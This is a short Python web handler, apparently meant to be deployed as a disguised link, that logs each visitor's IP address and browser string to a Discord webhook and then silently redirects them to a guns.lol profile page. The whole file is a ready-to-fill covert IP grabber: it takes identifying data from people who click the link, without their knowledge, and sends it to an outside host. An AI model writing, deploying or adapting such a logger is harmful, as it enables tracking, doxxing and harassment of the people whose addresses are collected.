from http.server import BaseHTTPRequestHandler
import requests
import json

# Replace with your actual Discord Webhook URL
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
# Replace with your guns.lol profile URL
REDIRECT_URL = "https://guns.lol/YOUR_USERNAME"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. Collect Visitor Data
        ip_address = self.headers.get('x-forwarded-for', self.client_address[0])
        user_agent = self.headers.get('user-agent', 'Unknown')
        
        # 2. Prepare the Discord Message
        data = {
            "embeds": [{
                "title": "🎯 New Visitor Logged",
                "color": 16711680, # Red
                "fields": [
                    {"name": "IP Address", "value": f"`{ip_address}`", "inline": True},
                    {"name": "Device/Browser", "value": user_agent, "inline": False}
                ],
                "footer": {"text": "Guns.lol Redirect Logger"}
            }]
        }

        # 3. Send to Discord
        try:
            requests.post(WEBHOOK_URL, json=data)
        except Exception as e:
            print(f"Webhook failed: {e}")

        # 4. Perform the Redirect
        self.send_response(302)
        self.send_header('Location', REDIRECT_URL)
        self.end_headers()
